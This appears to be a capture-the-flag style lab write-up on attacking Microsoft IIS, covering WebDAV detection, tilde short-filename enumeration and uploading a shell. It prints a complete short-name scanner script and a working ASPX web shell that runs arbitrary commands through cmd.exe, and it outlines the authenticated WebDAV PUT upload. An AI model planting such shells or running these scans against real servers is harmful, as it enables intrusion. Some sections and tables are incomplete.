### 1. What IIS Version Numbers Tell You

IIS versions are closely associated with Windows Server versions. Knowing the IIS version helps us understand what features may be available and which vulnerabilities may be relevant.

| IIS Version   | Windows Server            | Status      |
| ------------- | ------------------------- | ----------- |
| IIS 6.0       | Server 2003               | End of Life |
| IIS 7.0 / 7.5 | Server 2008 / 2008 R2     | End of Life |
| IIS 8.0 / 8.5 | Server 2012 / 2012 R2     | End of Life |
| IIS 10.0      | Server 2016 / 2019 / 2022 | Current     |



### 2. IIS Architecture (The Parts That Matter for Attacks)


Understanding the request flow helps you know where vulnerabilities live and why certain attacks work. A request arriving at an IIS server passes through several layers:

An HTTP request passes through several IIS components:

| Component            | Role                                                |
| -------------------- | --------------------------------------------------- |
| **HTTP.sys**         | Kernel-level HTTP driver that receives HTTP traffic |
| **W3SVC / WAS**      | Manages IIS services and application pools          |

| **ASP.NET / .NET**   | Processes ASP.NET applications                      |

The important idea is that different vulnerabilities can exist at different layers.

### 4. WebDAV Detection with OPTIONS
**WebDAV** extends HTTP with methods for managing files remotely.

Important WebDAV methods include:
| Method     | Purpose                    |
| ---------- | -------------------------- |
| `PUT`      | Create/upload a file       |
| `DELETE`   | Delete a file              |
| `COPY`     | Copy a resource            |
| `MOVE`     | Move a resource            |
| `PROPFIND` | Query resource information |
| `LOCK`     | Lock a resource            |
| `UNLOCK`   | Remove a lock              |


Check the server's supported methods:
````
curl -X OPTIONS http://TARGET_IP/webdav/ -sv 2>&1 | grep -E "Allow:|DAV:"
````

| Part                   | Meaning                                            |  
| ---------------------- | -------------------------------------------------- |
| `curl`                 | Sends an HTTP request                              | 
| `-X OPTIONS`           | Sends an HTTP `OPTIONS` request                    |
| `http://10.49.160.207` | Target web server                                  |
| `-s`                   | Silent mode                                        |                                           
| `-v`                   | Verbose output, including request/response headers |                                            
| `2>&1`                 | Combines error output with normal output           |                                           
| `grep -E`              | Searches using an extended pattern                 |                                            
| `"Allow:`               | DAV:" ` Searches for either `Allow:` **OR** `DAV:` |
| `Allow:`               | Shows HTTP methods the server allows               |                                  
| `DAV:`                 | Shows WebDAV capabilities supported by the server  |                                            


Example:
````
curl -X OPTIONS http://10.49.160.207 -sv 2>&1 | grep -E "Allow:|DAV:"
````
<img width="1277" height="135" alt="image" src="https://github.com/user-attachments/assets/0a08f1db-6657-476b-bce3-0d22fda4f44f" />


The ``DAV:`` header is a strong indication that WebDAV is enabled.

If WebDAV is enabled, the response includes a ``DAV:`` header and an extended ``Allow:`` list:
````
curl -X OPTIONS http://10.49.160.207/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
````

### 5. Why WebDAV Matters

WebDAV itself is not automatically a vulnerability.

The dangerous situation is:
````
WebDAV enabled
      ↓
Directory is writable
      ↓
Files can be uploaded
      ↓
Uploaded files are processed
      ↓
Potential security impact
````
So the investigation should determine **what the WebDAV directory permits**, rather than assuming that WebDAV automatically means compromise.

### 7. Normal vs Suspicious Traffic
| Pattern       | Normal                            | Suspicious                          |

| File types    | `.html`, `.css`, `.js`            | Unexpected `.aspx` files            |
| Status codes  | `200`, `304`, `301`, `302`, `404` | Unexpected `201 Created`            |
| Server header | Expected IIS version              | Unexpected/EOL version              |
| WebDAV        | Not exposed                       | `DAV:` header                       |
| Directory     | Read-only                         | Writable WebDAV directory           |

## Task 3: IIS Tilde (Short Filename) Enumeration

### What Is IIS Tilde Enumeration?
IIS can sometimes reveal information about files and directories through the **Windows 8.3 short filename format**.

<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/c09c6676-120b-4771-8b5b-8f3cb85ba2b7" />


Windows may create a short name for a long filename:
````
BackupFiles
     ↓
BACKUP~1
````
An attacker can use differences in IIS responses to determine whether a particular short name exists.


### 2. The 8.3 Short Filename Format

The traditional Windows format is:
````
XXXXXXXX.XXX
````
- Up to ``8 characters`` for the filename
- Up to ``3 characters`` for the extension

For example:
````
BackupFiles
    ↓
BACKUP~1
````
Another example:
````
AdminPortal
    ↓
ADMINI~1
````

| Long Name           | Possible 8.3 Name |
| ------------------- | ----------------- |
| `BackupFiles`       | `BACKUP~1`        |
| `AdminPortal`       | `ADMINI~1`        |
| `configuration.asp` | `CONFIG~1.ASP`    |
| `users_backup.xlsx` | `USERS_~1.XLS`    |

The short name does **not necessarily reveal the complete original filename**. It mainly gives useful information about the beginning of the name and extension.



### 3. How the Enumeration Works
````
Attacker
   │
   ▼
Send specially crafted HTTP request
   │
   ▼
IIS processes short-name pattern
   │
   ├── Different response
   │       ↓
   │   Possible resource exists
   │
   └── Normal response
           ↓
       Probably doesn't exist
````

The important signal is often a **difference in HTTP response status or response size**.

````
/backup~1/
      ↓
404 response with one size

/random~1/
      ↓
404 response with another size
````
That difference can indicate that IIS recognizes the short-name pattern.

#### Full script:
````
#!/usr/bin/env python
# encoding:utf-8
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    

import sys
import threading
import time
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

try:
    # python 2.x
    import httplib
    import urlparse
    import Queue as queue
except Exception as e:
    # python 3.x
    import http.client as httplib
    import urllib.parse as urlparse
    import queue


class Scanner(object):
    def __init__(self, target):
        self.target = target.lower()
        if not self.target.startswith('http'):
            self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, params, query, fragment = urlparse.urlparse(target)
        if self.path[-1:] != '/':    # ends with slash
            self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = ''
        self.msg_queue = queue.Queue()
        self.STOP_ME = False
        threading.Thread(target=self._print).start()

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc)
            else:
                conn = httplib.HTTPConnection(self.netloc)
            return conn
        except Exception as e:
            print('[_conn.Exception]', e)
            return None

    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request(self.request_method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception as e:
            raise Exception('[_get_status.Exception] %s' % str(e))

    def is_vulnerable(self):
        try:
            for _method in ['GET', 'OPTIONS']:
                self.request_method = _method
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
                if status_1 == 404 and status_2 != 404:
                    return True
            return False
        except Exception as e:
            raise Exception('[is_vul.Exception] %s' % str(e) )

    def run(self):
        for c in self.alphanum:
            self.queue.put((self.path + c, '.*'))    # filename, extension
        for i in range(20):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        for t in self.threads:
            t.join()
        self.STOP_ME = True

    def report(self):
        print('-' * 64)
        for d in self.dirs:
            print('Dir:  %s' % d)
        for f in self.files:
            print('File: %s' % f)
        print('-' * 64)
        print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))
        print('Note that * is a wildcard, matches any character zero or more times.')

    def _print(self):
        while not self.STOP_ME or (not self.msg_queue.empty()):
            if self.msg_queue.empty():
                time.sleep(0.05)
            else:
                print(self.msg_queue.get())

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))

                    if len(url) - len(self.path) < 6:    # enum first 6 chars only
                        for c in self.alphanum:
                            self.queue.put((url + c, ext))
                    else:
                        if ext == '.*':
                            self.queue.put((url, ''))

                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory ' + url + '~1\t[Done]')

                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')

                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4:    # < len('.as*')
                                    self.queue.put((url, ext[:-1] + c))

            except queue.Empty as e:
                break
            except Exception as e:
                print('[Exception]', e)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('Usage: python IIS_shortname_Scan.py http://www.target.com/')
        sys.exit()

    target = sys.argv[1]
    s = Scanner(target)
    if not s.is_vulnerable():
        s.STOP_ME = True
        print('Server is not vulnerable')
        sys.exit(0)

    print('Server is vulnerable, please wait, scanning...')
    s.run()
    s.report()
````

#### How the Scanner Works

The scanner starts with short prefixes:
````
a~1.*
b~1.*
c~1.*
...
````
If IIS responds differently for a prefix, the scanner continues expanding it.

For example:
````
b~1.*
   ↓
ba~1.*
   ↓
bac~1.*
   ↓
back~1.*
   ↓
backu~1.*
   ↓
backup~1
````
So it gradually reconstructs the short name.


#### What the Results Mean

Example:
````

Directory: /backup~1
````
2 Directories, 0 Files found

This tells us that IIS appears to have resources whose short names begin with:
````

````
The scanner does not automatically tell us the complete original name.

## Task 4: WebDAV Exploitation: Uploading an ASPX Shell

This task takes the credentials discovered in Task 3 and uses them to test whether the IIS WebDAV directory allows an authenticated file upload.


### 1. Three Conditions for a Successful Shell Upload

For the ASPX file upload to work, all three conditions must be true:

| Condition                  | Meaning                                                               |
| -------------------------- | --------------------------------------------------------------------- |
| **WebDAV enabled**         | IIS accepts WebDAV methods such as `PUT`                              |
| **Valid credentials**      | The `/webdav/` directory requires authentication                      |
| **Script Execute enabled** | IIS executes `.aspx` files instead of treating them as ordinary files |


The attack flow is:
````
Credentials
     ↓
NTLM Authentication
     ↓
PUT /webdav/cmd.aspx
     ↓
HTTP 201 Created
     ↓
Request cmd.aspx
     ↓
ASP.NET executes the file
````
If one condition is missing, execution will fail.


### 2. Preparing the ASPX Shell

The lab uses an ASPX file named:
````
cmd.aspx
````
The important idea is that the page reads a cmd parameter:
````
cmd.aspx?cmd=whoami
````
and executes that command through Windows cmd.exe.

The lab's example shell is:
````
<%@ Page Language="C#" %>
<%
string cmd = Request.QueryString["cmd"];

if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
}
%>
````

### 3. Uploading the ASPX Shell

The lab uses NTLM authentication with ``curl``.

The important options are:
| Option     | Meaning                          |
| ---------- | -------------------------------- |
| `-v`       | Show detailed HTTP communication |
| `--ntlm`   | Use NTLM authentication          |
| `-u`       | Supply username and password     |
| `-T`       | Upload a local file using `PUT`  |
| `cmd.aspx` | File being uploaded              |
| `/webdav/` | WebDAV destination               |

### 4. What Does 201 Created Mean?

This is the important part of the output:
````
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
````
``201`` Created means:
````
PUT request
     ↓
Authentication accepted
     ↓
File uploaded
     ↓
IIS created cmd.aspx
````
So the upload was successful.
